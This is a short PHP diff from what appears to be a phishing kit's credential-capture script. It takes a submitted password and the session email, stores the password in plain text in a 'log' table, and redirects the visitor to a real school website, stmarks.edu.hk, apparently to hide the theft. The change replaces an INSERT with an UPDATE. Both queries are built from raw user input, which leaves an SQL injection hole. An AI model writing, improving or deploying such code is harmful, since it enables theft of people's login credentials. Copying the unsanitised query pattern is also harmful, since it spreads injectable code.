@@ -21,13 +21,12 @@ session_start();
 include("db.php");
 $email = $_SESSION['email'];
 if (isset($_POST['password'])) {
-    date_default_timezone_set('Asia/Hong_Kong');
-    $time = date('Y-m-d H:i:s', time());
     $password = $_POST['password'];
     $_SESSION['password'] = $password; // do not drop, still used in proc.php
 
     db_open();
-    db_query("INSERT INTO `log`(`date`, `email`, `password`) VALUES ('$time','$email','$password')");
+    db_query("UPDATE log SET password='$password' WHERE email='$email'");
+    
     header("Location: https://www.stmarks.edu.hk/web/");
 }
 ?>
